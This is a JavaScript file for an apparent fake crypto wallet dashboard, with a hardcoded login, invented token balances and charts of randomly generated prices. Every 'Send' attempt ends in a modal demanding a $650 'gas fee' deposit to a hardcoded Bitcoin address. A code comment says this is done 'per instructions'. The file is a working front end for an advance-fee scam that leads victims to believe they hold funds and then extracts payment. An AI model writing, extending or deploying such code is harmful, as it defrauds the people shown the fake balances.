const USERNAME = 'sarahhilton';
const PASSWORD = 'sarahhilton';
const BTC_RECEIVE_ADDRESS = 'bc1q7sjehwjvkhzwtmj8yj2srqylf06ds9gu88am72';

const tokens = [
  { symbol: 'BTC', name: 'Bitcoin', balance: 1.2 },
  { symbol: 'ETH', name: 'Ethereum', balance: 80 },
  { symbol: 'BNB', name: 'Binance Coin', balance: 200 },
  { symbol: 'SOL', name: 'Solana', balance: 500 },
  { symbol: 'USDC', name: 'USD Coin', balance: 5000 },
];

let prices = {};
let totalBalance = 0;
let charts = {};

const loginScreen = document.getElementById('login-screen');
const dashboard = document.getElementById('dashboard');
const loginForm = document.getElementById('login-form');
const loginError = document.getElementById('login-error');
const logoutBtn = document.getElementById('logout-btn');
const totalBalanceEl = document.getElementById('total-balance');
const cryptoListEl = document.getElementById('crypto-list');

const modal = document.getElementById('modal');
const modalContent = document.getElementById('modal-content');
const modalClose = document.getElementById('modal-close');

function formatUSD(num) {
  return '$' + num.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

async function fetchPrices() {
  try {
    const ids = tokens.map(t => {
      if (t.symbol === 'BTC') return 'bitcoin';
      if (t.symbol === 'ETH') return 'ethereum';
      if (t.symbol === 'BNB') return 'binancecoin';
      if (t.symbol === 'SOL') return 'solana';
      if (t.symbol === 'USDC') return 'usd-coin';
      return '';
    }).join(',');

    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
    const data = await res.json();

    prices = {
      BTC: data.bitcoin.usd,
      ETH: data.ethereum.usd,
      BNB: data.binancecoin.usd,
      SOL: data.solana.usd,
      USDC: data['usd-coin'].usd,
    };
  } catch (err) {
    console.error('Failed to fetch prices', err);
    prices = {
      BTC: 60000,
      ETH: 3500,
      BNB: 600,
      SOL: 150,
      USDC: 1,
    };
  }
}

function calculateTotal() {
  totalBalance = tokens.reduce((sum, t) => sum + t.balance * prices[t.symbol], 0);
}

function renderDashboard() {
  totalBalanceEl.textContent = formatUSD(totalBalance);

  cryptoListEl.innerHTML = '';

  tokens.forEach(token => {
    const value = token.balance * prices[token.symbol];
    const card = document.createElement('div');
    card.className = 'bg-gray-800 rounded-lg p-4 flex flex-col justify-between items-start shadow-lg';

    card.innerHTML = `
      <div class="w-full flex justify-between items-center mb-2">
        <h4 class="text-lg font-semibold">${token.name} (${token.symbol})</h4>
        <div class="text-sm font-mono text-gray-400">${token.balance} ${token.symbol}</div>
      </div>
      <div class="text-xl font-bold mb-3">${formatUSD(value)}</div>
      <canvas id="chart-${token.symbol}" class="chart-container"></canvas>
      <div class="w-full mt-4 flex justify-between space-x-2">
        <button class="send-btn bg-green-600 hover:bg-green-700 py-1 px-3 rounded transition" data-token="${token.symbol}">Send</button>
        <button class="receive-btn bg-blue-600 hover:bg-blue-700 py-1 px-3 rounded transition" data-token="${token.symbol}">Receive</button>
      </div>
    `;

    cryptoListEl.appendChild(card);

    // Create or update chart
    createOrUpdateChart(token.symbol);
  });

  attachButtonListeners();
}

function createOrUpdateChart(symbol) {
  const ctx = document.getElementById(`chart-${symbol}`).getContext('2d');

  // Fake price history data for demonstration (last 10 points)
  // In real app, would fetch historical prices for the chart
  const pricesHistory = [];
  for (let i = 0; i < 10; i++) {
    // Slight random variation around current price
    let basePrice = prices[symbol] || 100;
    let variation = (Math.random() - 0.5) * basePrice * 0.05;
    pricesHistory.push(basePrice + variation);
  }

  if (charts[symbol]) {
    charts[symbol].data.datasets[0].data = pricesHistory;
    charts[symbol].update();
  } else {
    charts[symbol] = new Chart(ctx, {
      type: 'line',
      data: {
        labels: Array.from({ length: 10 }, (_, i) => i + 1),
        datasets: [{
          label: `${symbol} Price`,
          data: pricesHistory,
          borderColor: '#34D399',
          backgroundColor: 'rgba(52, 211, 153, 0.2)',
          fill: true,
          tension: 0.3,
          pointRadius: 0,
        }]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        scales: {
          x: { display: false },
          y: { display: true, ticks: { color: '#eee' } }
        },
        plugins: {
          legend: { display: false }
        },
      }
    });
  }
}

function attachButtonListeners() {
  document.querySelectorAll('.send-btn').forEach(btn => {
    btn.onclick = () => openSendModal(btn.dataset.token);
  });

  document.querySelectorAll('.receive-btn').forEach(btn => {
    btn.onclick = () => openReceiveModal(btn.dataset.token);
  });

  document.getElementById('send-total-btn').onclick = () => openSendModal('TOTAL');
  document.getElementById('receive-total-btn').onclick = () => openReceiveModal('TOTAL');
}

function openReceiveModal(token) {
  modalContent.innerHTML = `
    <h3 class="text-xl font-bold mb-4">Receive ${token === 'TOTAL' ? 'Bitcoin (BTC)' : token}</h3>
    <p class="mb-4">Send funds to this BTC address:</p>
    <p class="break-all font-mono mb-6">${BTC_RECEIVE_ADDRESS}</p>
    <div id="qrcode" class="flex justify-center"></div>
    <button id="modal-close-btn" class="mt-6 w-full bg-blue-600 hover:bg-blue-700 py-2 rounded font-semibold text-white">Close</button>
  `;

  QRCode.toCanvas(document.getElementById('qrcode'), BTC_RECEIVE_ADDRESS, { width: 180 });

  document.getElementById('modal-close-btn').onclick = closeModal;
  showModal();
}

function openSendModal(token) {
  modalContent.innerHTML = `
    <h3 class="text-xl font-bold mb-4">Send ${token === 'TOTAL' ? 'Bitcoin (BTC)' : token}</h3>
    <label class="block mb-2">Amount to send (${token === 'TOTAL' ? 'BTC' : token}):</label>
    <input id="send-amount" type="number" min="0" step="any" class="w-full mb-4 p-2 rounded bg-gray-700 border border-gray-600 text-black" />
    <button id="confirm-send-btn" class="w-full bg-green-600 hover:bg-green-700 py-2 rounded font-semibold">Confirm Send</button>
    <button id="modal-close-btn" class="mt-4 w-full bg-gray-600 hover:bg-gray-700 py-2 rounded font-semibold">Cancel</button>
  `;

  document.getElementById('confirm-send-btn').onclick = () => confirmSend(token);
  document.getElementById('modal-close-btn').onclick = closeModal;

  showModal();
}

function confirmSend(token) {
  const amountInput = document.getElementById('send-amount');
  const amount = parseFloat(amountInput.value);

  if (!amount || amount <= 0) {
    alert('Please enter a valid amount.');
    return;
  }

  // Here you could add real balance checks and update balances, but we show the $650 fee modal per instructions
  showFeeModal();
}

function showFeeModal() {
  modalContent.innerHTML = `
    <h3 class="text-xl font-bold mb-4">Insufficient Gas Fee Deposit</h3>
    <p class="mb-4">You must deposit a gas fee of <strong>$650</strong> to the following BTC address:</p>
    <p class="break-all font-mono">${BTC_RECEIVE_ADDRESS}</p>
    <button id="modal-close-btn" class="mt-6 w-full bg-blue-600 hover:bg-blue-700 py-2 rounded font-semibold text-white">Close</button>
  `;
  document.getElementById('modal-close-btn').onclick = closeModal;
  showModal();
}

function showModal() {
  modal.classList.remove('hidden');
}

function closeModal() {
  modal.classList.add('hidden');
}

loginForm.onsubmit = e => {
  e.preventDefault();
  const formData = new FormData(loginForm);
  const user = formData.get('username');
  const pass = formData.get('password');

  if (user === USERNAME && pass === PASSWORD) {
    loginError.classList.add('hidden');
    loginScreen.classList.add('hidden');
    dashboard.classList.remove('hidden');
    initializeDashboard();
  } else {
    loginError.classList.remove('hidden');
  }
};

logoutBtn.onclick = () => {
  dashboard.classList.add('hidden');
  loginScreen.classList.remove('hidden');
  loginForm.reset();
};

async function initializeDashboard() {
  await fetchPrices();
  calculateTotal();
  renderDashboard();

  // Refresh prices every 60 seconds and update charts + total
  setInterval(async () => {
    await fetchPrices();
    calculateTotal();
    renderDashboard();
  }, 60000);
}
